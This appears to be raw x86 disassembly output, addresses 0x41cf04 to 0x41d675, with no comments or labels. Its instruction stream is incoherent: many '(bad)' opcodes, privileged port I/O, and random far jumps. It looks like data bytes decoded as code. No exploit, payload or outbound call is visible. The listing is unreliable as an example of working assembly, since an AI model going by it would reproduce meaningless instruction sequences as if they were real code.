  41cf04:	jecxz  0x41ce8b
  41cf06:	fadd   QWORD PTR [ecx+0x269a011e]
  41cf0c:	shl    bp,0xcc
  41cf10:	and    al,0x5c
  41cf12:	jmp    edi
  41cf14:	fisttp WORD PTR [edi-0x622a046b]
  41cf1a:	xor    esi,DWORD PTR [esi-0x74a0ac5]
  41cf20:	xchg   ebp,eax
  41cf21:	shl    DWORD PTR [ebx-0x52],0x38
  41cf25:	pop    ebp
  41cf26:	(bad)  
  41cf27:	shl    esp,1
  41cf29:	outs   dx,BYTE PTR ds:[esi]
  41cf2a:	stc    
  41cf2b:	and    DWORD PTR [esi+ecx*1],ecx
  41cf2e:	lock mov ah,BYTE PTR [esi]
  41cf31:	mov    al,ah
  41cf33:	pop    ss
  41cf34:	retf   0x1941
  41cf37:	ss mov ah,0x39
  41cf3a:	or     esp,DWORD PTR [ebp+0x1e]
  41cf3d:	cmc    
  41cf3e:	mov    eax,ds:0x287ea9c
  41cf43:	sub    ecx,edi
  41cf45:	lods   al,BYTE PTR ds:[esi]
  41cf46:	dec    edx
  41cf47:	sar    BYTE PTR [ebx-0x53],cl
  41cf4a:	jecxz  0x41cf6c
  41cf4c:	sub    edi,DWORD PTR [edx-0x7e94f5e4]
  41cf52:	cmp    DWORD PTR [ecx+0x36302e5b],esp
  41cf58:	enter  0x3af8,0xe8
  41cf5c:	lock jae 0x41cf4c
  41cf5f:	test   BYTE PTR [ebp+0x184a7294],bh
  41cf65:	cmp    DWORD PTR [ebp+0x7c],esp
  41cf68:	pop    ss
  41cf69:	in     al,dx
  41cf6a:	int3   
  41cf6b:	inc    ebp
  41cf6c:	push   eax
  41cf6d:	xlat   BYTE PTR ds:[ebx]
  41cf6e:	mov    edx,0xa097288f
  41cf73:	jle    0x41cf37
  41cf75:	pop    esi
  41cf76:	mov    al,0x81
  41cf78:	(bad)  
  41cf79:	xchg   ecx,eax
  41cf7a:	and    DWORD PTR gs:[ecx+0x3a],edi
  41cf7e:	loope  0x41cfb4
  41cf80:	adc    BYTE PTR [esi-0x282dc0bd],0xfa
  41cf87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf88:	in     eax,0x8d
  41cf8a:	sar    BYTE PTR [edi-0x250ebad5],0xac
  41cf91:	jmp    0xb34:0xf9294e9c
  41cf98:	sub    DWORD PTR [ecx],ebx
  41cf9a:	pop    ebx
  41cf9b:	mov    edx,0xf169f86a
  41cfa0:	dec    ebx
  41cfa1:	lock cmp al,0x36
  41cfa4:	push   ss
  41cfa5:	data16 jo 0x41cffd
  41cfa8:	aam    0x5c
  41cfaa:	fs mov edx,0x956a26b
  41cfb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cfb1:	imul   ebx,edi,0x3cee7c5c
  41cfb7:	pop    edx
  41cfb8:	test   BYTE PTR [esi],bl
  41cfba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cfbb:	aas    
  41cfbc:	sbb    bl,BYTE PTR [ecx-0x2a]
  41cfbf:	sbb    ecx,DWORD PTR [ebx+0x68]
  41cfc2:	es loopne 0x41d020
  41cfc5:	fcom   QWORD PTR [esi]
  41cfc7:	adc    esi,DWORD PTR [edi]
  41cfc9:	fwait
  41cfca:	mov    ebx,0x5c941f0e
  41cfcf:	sub    BYTE PTR [esi-0x5761a28d],al
  41cfd5:	mov    al,0x3e
  41cfd7:	inc    esi
  41cfd8:	mov    ebp,0xfdc84af9
  41cfdd:	mov    dl,0xef
  41cfdf:	dec    ecx
  41cfe0:	test   DWORD PTR [edx],esp
  41cfe2:	fstp   st(6)
  41cfe4:	inc    BYTE PTR [ecx+0x7]
  41cfe7:	mov    eax,ds:0xfc51dc4d
  41cfec:	(bad)  
  41cfed:	xor    dl,cl
  41cfef:	loope  0x41cfd9
  41cff1:	jge    0x41d067
  41cff3:	xchg   ebp,eax
  41cff4:	sub    cl,ah
  41cff6:	scas   eax,DWORD PTR es:[edi]
  41cff7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cff8:	inc    eax
  41cff9:	xchg   BYTE PTR [ecx],ch
  41cffb:	cmp    BYTE PTR [ebx-0x6f],0xf3
  41cfff:	jmp    0x7f4e:0xb33c8bf2
  41d006:	bound  eax,QWORD PTR [edi+0x26]
  41d009:	in     al,0x6a
  41d00b:	ss sbb ebx,edx
  41d00e:	jecxz  0x41cfd4
  41d010:	xchg   DWORD PTR [esi+0x10],edi
  41d013:	ds mov gs:0xdcc3d645,al
  41d01a:	pop    edx
  41d01b:	push   0xffffff8d
  41d01d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d01e:	clc    
  41d01f:	(bad)  
  41d020:	rcl    DWORD PTR ds:0x3f6aa430,1
  41d026:	jmp    0x41d08e
  41d028:	div    BYTE PTR ds:0x7960ebe3
  41d02e:	fimul  WORD PTR [edx+edx*8+0x51102e4f]
  41d035:	push   ebx
  41d036:	mov    ebx,0xdbebbbd3
  41d03b:	aas    
  41d03c:	fdivr  QWORD PTR [edx+0x11]
  41d03f:	addr16 pop es
  41d041:	cmp    BYTE PTR [ebp+0xbe08067],cl
  41d047:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d048:	cmp    eax,0xc6a235d1
  41d04d:	pop    ecx
  41d04e:	push   es
  41d04f:	sbb    DWORD PTR [ecx-0x4a],esp
  41d052:	pop    edx
  41d053:	xor    al,0x1f
  41d055:	inc    esp
  41d056:	push   0xa
  41d058:	pop    esi
  41d059:	adc    eax,0xe4f096a
  41d05e:	dec    ebx
  41d05f:	call   0x3c713de0
  41d064:	xor    esp,0x6
  41d067:	rcr    DWORD PTR [ebx+edx*2+0x78969fc6],1
  41d06e:	ins    DWORD PTR es:[edi],dx
  41d06f:	ss int3 
  41d071:	clc    
  41d072:	mov    ebx,0xb602f1e6
  41d077:	jl     0x41d09a
  41d079:	xchg   ebp,eax
  41d07a:	mov    ds:0x6317e6a,eax
  41d07f:	sbb    edx,DWORD PTR [ebx]
  41d081:	mov    dl,BYTE PTR [eax-0x3e]
  41d084:	das    
  41d085:	ss adc eax,0x9d5987c9
  41d08b:	scas   eax,DWORD PTR es:[edi]
  41d08c:	sub    al,0x51
  41d08e:	jno    0x41d075
  41d090:	mov    ds:0xbddab1f3,eax
  41d095:	add    BYTE PTR [ecx-0x7],dl
  41d098:	or     eax,0x9ffc5702
  41d09d:	adc    al,0xc2
  41d09f:	data16 mov bh,0xfc
  41d0a2:	xlat   BYTE PTR ds:[ebx]
  41d0a3:	ins    BYTE PTR es:[edi],dx
  41d0a4:	test   al,0xe9
  41d0a6:	jae    0x41d02b
  41d0a8:	pop    ebx
  41d0a9:	into   
  41d0aa:	and    al,0xf9
  41d0ac:	xchg   esp,eax
  41d0ad:	sbb    DWORD PTR [edx+0x68],ebx
  41d0b0:	or     eax,0x5cfd7269
  41d0b5:	bound  esi,QWORD PTR es:[ebp+0x15]
  41d0b9:	mov    ebp,0xfbdf7c13
  41d0be:	jae    0x41d0ef
  41d0c0:	cwde   
  41d0c1:	adc    eax,0xe1b6392d
  41d0c6:	popf   
  41d0c7:	leave  
  41d0c8:	cmp    BYTE PTR [esi+0x8],0x89
  41d0cc:	xchg   ebp,eax
  41d0cd:	xlat   BYTE PTR ds:[ebx]
  41d0ce:	repz inc ecx
  41d0d0:	cmp    DWORD PTR [edi],esi
  41d0d2:	outs   dx,BYTE PTR ds:[esi]
  41d0d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d0d4:	sti    
  41d0d5:	(bad)  
  41d0d6:	ficom  WORD PTR [edi]
  41d0d8:	retf   0xcc0f
  41d0db:	sbb    eax,0x24927dc7
  41d0e0:	push   eax
  41d0e1:	sbb    BYTE PTR [ebx-0x24dfdf16],al
  41d0e7:	gs push 0x208d27e2
  41d0ed:	fdivr  QWORD PTR [eax-0x8]
  41d0f0:	mov    ch,0xbb
  41d0f2:	shl    DWORD PTR [ecx-0x58],0x27
  41d0f6:	push   edi
  41d0f7:	out    dx,al
  41d0f8:	and    al,0x80
  41d0fa:	mov    eax,edx
  41d0fc:	and    cl,BYTE PTR [esi+eiz*1]
  41d0ff:	sar    BYTE PTR [ebp-0x20],1
  41d102:	push   edi
  41d103:	xor    ebp,ebp
  41d105:	jnp    0x41d12b
  41d107:	sbb    ch,al
  41d109:	cld    
  41d10a:	clc    
  41d10b:	push   ds
  41d10c:	sbb    al,0x38
  41d10e:	rcr    BYTE PTR [ebp-0x59fcd840],cl
  41d114:	cmovs  edi,DWORD PTR [ebp-0x2]
  41d118:	into   
  41d119:	or     eax,0x45055b39
  41d11e:	adc    DWORD PTR [eax],0x14
  41d121:	push   esp
  41d122:	cmp    eax,0xef3a3676
  41d127:	ret    
  41d128:	test   BYTE PTR [esp+edx*2],ch
  41d12b:	leave  
  41d12c:	mov    edi,0xb7b15cc9
  41d131:	or     bl,BYTE PTR [eax]
  41d133:	ins    DWORD PTR es:[edi],dx
  41d134:	ss (bad) 
  41d136:	loopne 0x41d0ee
  41d138:	(bad)
  41d13b:	es jmp 0x3eec:0xacc0f80a
  41d143:	fstp   QWORD PTR [edi+0x6]
  41d146:	push   edi
  41d147:	hlt    
  41d148:	js     0x41d174
  41d14a:	lahf   
  41d14b:	and    al,0xed
  41d14d:	sbb    al,0xc2
  41d14f:	cld    
  41d150:	scas   eax,DWORD PTR es:[edi]
  41d151:	fcom   DWORD PTR [esi+0x7c]
  41d154:	sbb    DWORD PTR [ecx],edi
  41d156:	(bad)  
  41d157:	js     0x41d1c7
  41d159:	lods   al,BYTE PTR ds:[esi]
  41d15a:	mov    eax,0x94f5cdc4
  41d15f:	fincstp 
  41d161:	icebp  
  41d162:	and    ebp,DWORD PTR [ebx+0x67615d75]
  41d168:	pop    eax
  41d169:	cmp    esp,0xffffffe3
  41d16c:	push   ds
  41d16d:	jecxz  0x41d110
  41d16f:	mov    eax,0x60dc7445
  41d174:	inc    DWORD PTR [edi+edx*8]
  41d177:	loope  0x41d107
  41d179:	imul   edi,DWORD PTR [ebx+0x76],0xffffffed
  41d17d:	push   edi
  41d17e:	mov    ch,0x53
  41d180:	sbb    ah,BYTE PTR [esi]
  41d182:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d183:	mov    eax,ds:0x6107a85b
  41d188:	adc    al,0xd2
  41d18a:	jb     0x41d14d
  41d18c:	shl    DWORD PTR [ecx-0x71],1
  41d18f:	lds    ebx,FWORD PTR es:[eax+0x65]
  41d193:	shl    BYTE PTR [ecx-0x4c],1
  41d196:	push   ss
  41d197:	rcr    DWORD PTR [edi+0x4c4f2474],0x1f
  41d19e:	push   ss
  41d19f:	push   ds
  41d1a0:	rol    BYTE PTR [ebp-0x58],0x76
  41d1a4:	mov    ch,0xc6
  41d1a6:	jle    0x41d1de
  41d1a8:	mov    ch,0x25
  41d1aa:	sahf   
  41d1ab:	cwde   
  41d1ac:	fcomip st,st(2)
  41d1ae:	cmc    
  41d1af:	jge    0x41d173
  41d1b1:	out    dx,al
  41d1b2:	jge    0x41d1a8
  41d1b4:	(bad)  
  41d1b5:	xchg   edi,eax
  41d1b6:	cmp    al,0x81
  41d1b8:	jno    0x41d189
  41d1ba:	xchg   edx,eax
  41d1bb:	aam    0x88
  41d1bd:	mov    DWORD PTR [ebp+0x6ac9bd6c],ebp
  41d1c3:	retf   0x4742
  41d1c6:	jg     0x41d180
  41d1c8:	adc    BYTE PTR [ebx+0x504da38f],bh
  41d1ce:	xchg   ebp,eax
  41d1cf:	gs sahf 
  41d1d1:	push   0xffffffc2
  41d1d3:	inc    ebp
  41d1d4:	sahf   
  41d1d5:	sti    
  41d1d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d1d7:	inc    edi
  41d1d8:	je     0x41d24a
  41d1da:	sahf   
  41d1db:	lea    edi,[edx+0x60a2c6db]
  41d1e1:	lds    esi,FWORD PTR ds:0xd74a998
  41d1e7:	sub    BYTE PTR [ecx-0x4f8a54a3],0x5c
  41d1ee:	push   esp
  41d1ef:	sub    al,0xaf
  41d1f1:	gs xchg ebp,eax
  41d1f3:	mov    eax,ds:0xcfd08a8
  41d1f8:	mov    eax,esp
  41d1fa:	push   ebx
  41d1fb:	jle    0x41d24f
  41d1fd:	dec    edx
  41d1fe:	loopne 0x41d21f
  41d200:	sti    
  41d201:	mov    ch,0xf1
  41d203:	pop    edi
  41d204:	stos   BYTE PTR es:[edi],al
  41d205:	shl    DWORD PTR [ebp-0x66c4d989],cl
  41d20b:	fidivr DWORD PTR [eax]
  41d20d:	xchg   esi,eax
  41d20e:	or     esp,DWORD PTR [ebx+0x1f894973]
  41d214:	dec    esp
  41d215:	and    DWORD PTR [eax+esi*1-0x22],ebp
  41d219:	inc    ecx
  41d21a:	ret    
  41d21b:	loope  0x41d299
  41d21d:	pusha  
  41d21e:	sbb    al,0xb9
  41d220:	xchg   edx,eax
  41d221:	jnp    0x41d1f1
  41d223:	jns    0x41d27a
  41d225:	test   BYTE PTR [ebp-0x28],dl
  41d228:	mov    edx,0xe30ef24e
  41d22d:	mov    cl,0xa7
  41d22f:	or     al,0xff
  41d231:	jp     0x41d223
  41d233:	shr    DWORD PTR [ebx+0x5fba6597],cl
  41d239:	scas   eax,DWORD PTR es:[edi]
  41d23a:	pop    ecx
  41d23b:	lock push 0xffffff82
  41d23e:	sub    DWORD PTR [edx],edi
  41d240:	call   0x29a2db5
  41d245:	stos   DWORD PTR es:[edi],eax
  41d246:	push   eax
  41d247:	cmp    BYTE PTR [ebx+ebp*2],0x40
  41d24b:	loop   0x41d273
  41d24d:	xor    DWORD PTR [ebp+ebp*2-0x22],edx
  41d251:	sub    eax,0xe8fc3c63
  41d256:	retf   0xc971
  41d259:	sbb    ah,BYTE PTR [ecx+0x3f4c4860]
  41d25f:	sub    eax,0xeff40291
  41d264:	sbb    cl,dl
  41d266:	cmp    eax,0xa3bc81bb
  41d26b:	test   al,0xfd
  41d26d:	test   dl,dh
  41d26f:	loop   0x41d2aa
  41d271:	mov    esi,0x238eab04
  41d276:	ins    BYTE PTR es:[edi],dx
  41d277:	push   eax
  41d278:	in     eax,0x7e
  41d27a:	cmp    al,0x42
  41d27d:	test   al,0xd7
  41d27f:	cwde   
  41d280:	mov    dh,0x30
  41d282:	and    BYTE PTR [edx],bl
  41d284:	fild   DWORD PTR [ecx-0x4dd65a73]
  41d28a:	dec    ebp
  41d28b:	xchg   esi,eax
  41d28c:	stc    
  41d28d:	sbb    eax,DWORD PTR [ebp-0x27]
  41d290:	mov    WORD PTR [ebp+eax*2+0x7f371c5],fs
  41d297:	in     eax,0xf1
  41d299:	xchg   edx,eax
  41d29a:	adc    eax,0xab9a7b7c
  41d29f:	pop    ebx
  41d2a0:	adc    bl,0x76
  41d2a3:	push   ds
  41d2a4:	pop    edi
  41d2a5:	mov    ds:0x71812d20,al
  41d2aa:	stos   DWORD PTR es:[edi],eax
  41d2ab:	inc    eax
  41d2ac:	push   esi
  41d2ad:	pop    ds
  41d2ae:	arpl   WORD PTR [edi],dx
  41d2b0:	pop    esi
  41d2b1:	ins    DWORD PTR es:[edi],dx
  41d2b2:	sbb    DWORD PTR [edi],eax
  41d2b4:	aas    
  41d2b5:	pushf  
  41d2b6:	jae    0x41d32e
  41d2b8:	jmp    0x41d2a6
  41d2ba:	pop    edi
  41d2bb:	or     DWORD PTR ds:0x731d1736,0x1604b8d2
  41d2c5:	out    0x81,al
  41d2c7:	xchg   esp,eax
  41d2c8:	out    0x64,al
  41d2ca:	jno    0x41d2d9
  41d2cc:	add    BYTE PTR [esi],ch
  41d2ce:	std    
  41d2cf:	inc    ebx
  41d2d0:	fwait
  41d2d1:	je     0x41d2e7
  41d2d3:	inc    edx
  41d2d4:	inc    esi
  41d2d5:	retf   
  41d2d6:	cmp    edi,DWORD PTR [esi-0x4de6e1b0]
  41d2dc:	jp     0x41d2aa
  41d2de:	add    eax,0x79d91a89
  41d2e3:	call   0x7c33edac
  41d2e8:	push   edi
  41d2e9:	addr16 mov esi,0x952b64ff
  41d2ef:	jno    0x41d2b4
  41d2f1:	xlat   BYTE PTR ds:[ebx]
  41d2f2:	jae    0x41d2b7
  41d2f4:	(bad)  
  41d2f5:	pop    esi
  41d2f6:	inc    esp
  41d2f7:	iret   
  41d2f8:	or     ah,al
  41d2fa:	mov    bl,al
  41d2fc:	push   esi
  41d2fd:	cwde   
  41d2fe:	ror    DWORD PTR [ebp-0xa634fb4],1
  41d304:	out    dx,al
  41d305:	enter  0xc8a0,0x4e
  41d309:	ja     0x41d33f
  41d30b:	xchg   DWORD PTR [ebx-0x1f1cb65c],eax
  41d311:	enter  0x5cc0,0x18
  41d315:	das    
  41d316:	sbb    DWORD PTR [ebx],0xffffffc9
  41d319:	cwde   
  41d31a:	mov    edx,0x8e31b5aa
  41d31f:	xchg   ecx,eax
  41d320:	pop    eax
  41d321:	iret   
  41d322:	inc    eax
  41d323:	xchg   edi,eax
  41d324:	xor    bh,ah
  41d326:	sbb    BYTE PTR [edi-0x3e],ch
  41d329:	test   eax,0x48de33b9
  41d32e:	pushf  
  41d32f:	xor    eax,0xc0e4142
  41d334:	test   al,0x29
  41d336:	mov    ebp,0xd1ec8a02
  41d33b:	ja     0x41d327
  41d33d:	and    eax,0x5bbe239e
  41d342:	pushf  
  41d343:	fild   WORD PTR [ecx-0x17]
  41d346:	xor    BYTE PTR ss:[edx+0x1179b99c],0x98
  41d34e:	cdq    
  41d34f:	xor    DWORD PTR [ebx+0xe9ca1d],esi
  41d355:	ret    0x97be
  41d358:	pop    es
  41d359:	mov    ah,0x6d
  41d35b:	rcl    DWORD PTR [eax],cl
  41d35d:	or     BYTE PTR [esi+eax*4-0x1c],dl
  41d361:	cmp    bh,BYTE PTR [edx]
  41d363:	shl    ah,cl
  41d365:	push   cs
  41d366:	ficomp DWORD PTR [ecx+ebp*2+0x44]
  41d36a:	dec    ebp
  41d36b:	xchg   edi,eax
  41d36c:	adc    BYTE PTR [edx+ebp*2],dl
  41d36f:	ds mov ecx,0xb810dabf
  41d375:	mov    eax,0x6ad642f5
  41d37a:	mov    esp,0x4f1d1f99
  41d37f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d380:	cmp    al,0xc6
  41d382:	cld    
  41d383:	pop    ebx
  41d384:	stc    
  41d385:	hlt    
  41d386:	pushf  
  41d387:	inc    edx
  41d388:	push   ebx
  41d389:	test   al,0xec
  41d38b:	pop    ebp
  41d38c:	out    dx,al
  41d38d:	push   esi
  41d38e:	sbb    BYTE PTR [ebx-0x79f7477c],bh
  41d394:	adc    BYTE PTR [esi+0x4b],cl
  41d397:	pop    ss
  41d398:	pop    ecx
  41d399:	sub    BYTE PTR [esi+0x12],bl
  41d39c:	add    BYTE PTR [eax+0x2cdeba0a],bh
  41d3a2:	and    ebx,esp
  41d3a4:	cld    
  41d3a5:	loope  0x41d3bf
  41d3a7:	add    DWORD PTR [ecx],esp
  41d3a9:	mov    edi,DWORD PTR [eax-0x6]
  41d3ac:	shl    BYTE PTR [edx],1
  41d3ae:	pop    ebx
  41d3af:	das    
  41d3b0:	das    
  41d3b1:	pop    edx
  41d3b2:	inc    edi
  41d3b3:	sbb    eax,0xd70cd61a
  41d3b8:	push   ebp
  41d3b9:	js     0x41d420
  41d3bb:	adc    eax,0xd8ab6ea1
  41d3c0:	add    BYTE PTR [eax],cl
  41d3c2:	jae    0x41d406
  41d3c4:	jge    0x41d404
  41d3c6:	sub    BYTE PTR [edi],bl
  41d3c8:	fstp   QWORD PTR cs:[ebp-0x78]
  41d3cc:	pop    edx
  41d3cd:	cmp    ah,bh
  41d3cf:	lods   eax,DWORD PTR ds:[esi]
  41d3d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d3d1:	es jmp ebp
  41d3d4:	lock xchg edi,eax
  41d3d6:	ficomp DWORD PTR ds:0x1e2a781b
  41d3dc:	mov    eax,ds:0xe4ccf4ce
  41d3e1:	push   ebp
  41d3e2:	add    eax,0xf781136e
  41d3e7:	(bad)  
  41d3e8:	add    dl,BYTE PTR [esi-0x80]
  41d3eb:	outs   dx,DWORD PTR ds:[esi]
  41d3ec:	sbb    eax,0xcded684a
  41d3f1:	mov    ds:0x8a95c2d7,eax
  41d3f6:	cdq    
  41d3f7:	fdivr  st(6),st
  41d3f9:	mov    bh,0x12
  41d3fb:	xchg   ebp,eax
  41d3fc:	sbb    BYTE PTR [ecx+0x581cc463],ah
  41d402:	aaa    
  41d403:	xor    al,0x46
  41d405:	or     BYTE PTR [esi+0x1272afdf],dl
  41d40b:	mov    bl,0x48
  41d40d:	ins    BYTE PTR es:[edi],dx
  41d40e:	sub    eax,ebx
  41d410:	mov    ebp,0x18268153
  41d415:	adc    esi,ecx
  41d417:	popa   
  41d418:	in     al,0x84
  41d41a:	xchg   DWORD PTR [ebx-0x4a],ecx
  41d41d:	gs aas 
  41d41f:	sbb    ecx,esp
  41d421:	mov    ecx,0x2eb7902b
  41d426:	inc    esi
  41d427:	xchg   ebp,eax
  41d428:	or     al,0x46
  41d42a:	mov    al,0xa
  41d42c:	sub    al,0x35
  41d42e:	sar    DWORD PTR [edi-0x78b85515],0xc9
  41d435:	in     al,0x4d
  41d437:	pop    esi
  41d438:	dec    eax
  41d439:	icebp  
  41d43a:	sar    BYTE PTR [ebx],1
  41d43c:	add    esp,eax
  41d43e:	lea    ebx,cs:[esp+eax*1-0x5f]
  41d443:	push   cs
  41d444:	rcl    BYTE PTR [ebp-0x471493d4],cl
  41d44a:	js     0x41d41e
  41d44c:	cmp    eax,0xbca60ef1
  41d451:	mov    ?,WORD PTR [esi+0x27f2cbb9]
  41d457:	(bad)  
  41d458:	jle    0x41d3fa
  41d45a:	push   ss
  41d45b:	xor    eax,0x57be3cc5
  41d460:	push   esi
  41d461:	xor    DWORD PTR [edi+0x1a],0x35e06450
  41d468:	iret   
  41d469:	pop    ecx
  41d46a:	gs jns 0x41d442
  41d46d:	js     0x41d475
  41d46f:	cmp    BYTE PTR ds:0xcbf570af,al
  41d475:	push   ebp
  41d476:	jnp    0x41d40e
  41d478:	adc    ch,dh
  41d47a:	mov    bl,0xe
  41d47c:	in     al,dx
  41d47d:	int3   
  41d47e:	loopne 0x41d49d
  41d480:	movhps QWORD PTR [ecx+0x38],xmm5
  41d484:	mov    ds:0xcaa5af5f,al
  41d489:	mov    ah,0xb1
  41d48b:	in     al,0xa9
  41d48d:	jl     0x41d445
  41d48f:	je     0x41d49c
  41d491:	push   ebx
  41d492:	fst    QWORD PTR [ebx+0x27]
  41d495:	sub    al,0xb6
  41d497:	cli    
  41d498:	xchg   esp,eax
  41d499:	in     eax,dx
  41d49a:	mov    WORD PTR [edx-0x6c],ds
  41d49d:	out    dx,al
  41d49e:	out    dx,eax
  41d49f:	data16 jo 0x41d46d
  41d4a2:	rol    DWORD PTR [ebp+0x1ce47b4c],1
  41d4a8:	add    ecx,DWORD PTR [ecx+0x180ce01]
  41d4ae:	call   0xec8d:0x33c63008
  41d4b5:	rcl    ch,0xb0
  41d4b8:	xor    BYTE PTR [eax+edi*2-0x10],0xd4
  41d4bd:	ja     0x41d4bd
  41d4bf:	out    0xe,eax
  41d4c1:	fadd   QWORD PTR [edi-0x2752c0c5]
  41d4c7:	out    0x9b,eax
  41d4c9:	rcl    esi,cl
  41d4cb:	idiv   DWORD PTR [esi-0x197c0e25]
  41d4d1:	mov    dl,0xf6
  41d4d3:	aad    0xff
  41d4d5:	pop    ebx
  41d4d6:	push   ds
  41d4d7:	push   eax
  41d4d8:	push   cs
  41d4d9:	mov    WORD PTR [ecx-0x70243ec4],es
  41d4df:	lods   al,BYTE PTR ds:[esi]
  41d4e0:	fistp  QWORD PTR [eax-0x27724ad9]
  41d4e6:	(bad)  
  41d4e7:	xor    ah,BYTE PTR [ebp-0x2a95a649]
  41d4ed:	ret    
  41d4ee:	out    0x7a,eax
  41d4f0:	sub    eax,0xc9bb488a
  41d4f5:	scas   eax,DWORD PTR es:[edi]
  41d4f6:	mov    esp,0xdad5d4f6
  41d4fb:	out    0xd,eax
  41d4fd:	mov    ah,ah
  41d4ff:	adc    eax,ecx
  41d501:	pop    ds
  41d502:	test   dl,cl
  41d504:	pop    esp
  41d505:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d506:	std    
  41d507:	outs   dx,DWORD PTR ds:[esi]
  41d508:	xchg   BYTE PTR [ecx],bh
  41d50a:	je     0x41d533
  41d50c:	iret   
  41d50d:	xchg   edx,eax
  41d50e:	sub    al,0x52
  41d510:	call   0x4be6:0xca344f6e
  41d517:	into   
  41d518:	sub    BYTE PTR [ebx+0x27],cl
  41d51b:	xlat   BYTE PTR ds:[ebx]
  41d51c:	add    bh,bh
  41d51e:	mov    ds:0x4019416f,eax
  41d523:	mov    cl,0xa5
  41d525:	lahf   
  41d526:	sub    cl,dh
  41d528:	aas    
  41d529:	call   0x29b538ab
  41d52e:	out    0x5e,al
  41d530:	js     0x41d573
  41d532:	out    dx,eax
  41d533:	out    0x2f,al
  41d535:	sub    ecx,DWORD PTR [esi]
  41d537:	in     eax,dx
  41d538:	out    dx,eax
  41d539:	fcom   DWORD PTR [edi]
  41d53b:	je     0x41d510
  41d53d:	and    ah,dh
  41d53f:	(bad)  
  41d540:	shl    DWORD PTR [esi],cl
  41d542:	(bad)  
  41d543:	and    edi,edi
  41d545:	jmp    0x7a17:0x3c4444dc
  41d54c:	mov    ds:0x62a0ad72,al
  41d551:	lea    ebp,[esi+0x69]
  41d554:	jg     0x41d50a
  41d556:	aaa    
  41d557:	add    BYTE PTR [eax+0x4f29358b],dh
  41d55d:	call   0x87b37c7e
  41d562:	mov    ah,0x32
  41d564:	pop    eax
  41d565:	or     al,0x24
  41d567:	cmp    al,0xe5
  41d569:	jns    0x41d57d
  41d56b:	xor    al,0x98
  41d56d:	gs mov ebp,0xcf517ada
  41d573:	push   esi
  41d574:	in     eax,dx
  41d575:	(bad)  
  41d576:	sub    DWORD PTR ds:0x340a7511,ecx
  41d57c:	xchg   esi,eax
  41d57d:	lahf   
  41d57e:	push   edi
  41d57f:	xchg   esi,eax
  41d580:	sbb    ch,dh
  41d582:	xchg   DWORD PTR ds:0x909be3b5,eax
  41d588:	repnz add ah,BYTE PTR ds:0xad931628
  41d58f:	mov    ds:0xd8b53511,al
  41d594:	mov    bl,0x73
  41d596:	xor    cl,cl
  41d598:	jo     0x41d558
  41d59a:	or     bl,dl
  41d59c:	fdivr  st,st(7)
  41d59e:	jne    0x41d5b4
  41d5a0:	lock cmp al,0x41
  41d5a3:	aaa    
  41d5a4:	popa   
  41d5a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d5a6:	jp     0x41d5c2
  41d5a8:	push   esp
  41d5a9:	out    0x7a,al
  41d5ab:	xor    BYTE PTR [edi+0x1f],al
  41d5ae:	ror    BYTE PTR [eax],cl
  41d5b0:	pusha  
  41d5b1:	(bad)  
  41d5b3:	inc    ecx
  41d5b4:	ficom  DWORD PTR [esi]
  41d5b6:	inc    edi
  41d5b7:	call   0x17a0c90c
  41d5bc:	fs jo  0x41d5ca
  41d5bf:	add    al,0x8a
  41d5c1:	es and eax,0x56e4edb4
  41d5c7:	shl    DWORD PTR [edi+ebp*2-0x25f7e52b],0xbe
  41d5cf:	cwde   
  41d5d0:	test   eax,0x2bdda0a7
  41d5d5:	sbb    ebp,DWORD PTR [ecx]
  41d5d7:	sub    esp,DWORD PTR [ecx-0x6857464f]
  41d5dd:	xlat   BYTE PTR ds:[ebx]
  41d5de:	lods   al,BYTE PTR ds:[esi]
  41d5df:	les    edx,FWORD PTR [eax]
  41d5e1:	and    eax,0xf3fee4bc
  41d5e6:	sbb    esp,ebx
  41d5e8:	lods   al,BYTE PTR ds:[esi]
  41d5e9:	add    esi,DWORD PTR [ecx+0x69558ae8]
  41d5ef:	sub    dh,BYTE PTR [esi+0x46]
  41d5f2:	and    al,0x25
  41d5f4:	das    
  41d5f5:	cmc    
  41d5f6:	xor    BYTE PTR [edx-0x4563788e],cl
  41d5fc:	jae    0x41d663
  41d5fe:	adc    BYTE PTR [ebx-0x71],dh
  41d601:	out    dx,eax
  41d602:	pop    es
  41d603:	push   ebx
  41d604:	pop    es
  41d605:	pop    ebx
  41d606:	add    BYTE PTR [edx],0x6
  41d609:	and    al,BYTE PTR [edi-0x211126be]
  41d60f:	mov    BYTE PTR [ecx-0x5a],bl
  41d612:	(bad)  
  41d613:	or     eax,esp
  41d615:	jae    0x41d681
  41d617:	mov    ecx,0xddbeb08
  41d61c:	mov    ds:0x795c925,al
  41d621:	mov    ebp,DWORD PTR [ecx]
  41d623:	mov    ss,WORD PTR [edi-0x6e5c6769]
  41d629:	or     DWORD PTR [ebx+edi*1+0x608fc318],edx
  41d630:	fnstsw WORD PTR [ebp+0x5c538e68]
  41d636:	ds test edi,edx
  41d639:	sbb    eax,0xa77db207
  41d63e:	xrelease mov BYTE PTR [eax-0x2c9cf31b],bh
  41d645:	arpl   WORD PTR [ebp+0x6a94b177],di
  41d64b:	inc    eax
  41d64c:	test   dh,dh
  41d64e:	inc    edx
  41d64f:	mov    BYTE PTR [ecx+0x1ad3c58c],cl
  41d655:	dec    edx
  41d656:	shr    DWORD PTR [esi],1
  41d658:	aad    0x82
  41d65a:	mov    edx,DWORD PTR [eax+0x43]
  41d65d:	aam    0x8e
  41d65f:	cld    
  41d660:	fs stos DWORD PTR es:[edi],eax
  41d662:	fidiv  DWORD PTR ds:0x22ed5dc
  41d668:	(bad)  
  41d669:	sar    BYTE PTR [edi+edx*4-0x49450513],1
  41d670:	inc    ebp
  41d671:	aad    0x73
  41d673:	loopne 0x41d67e
  41d675:	adc    cl,BYTE PTR [eax+0x16]
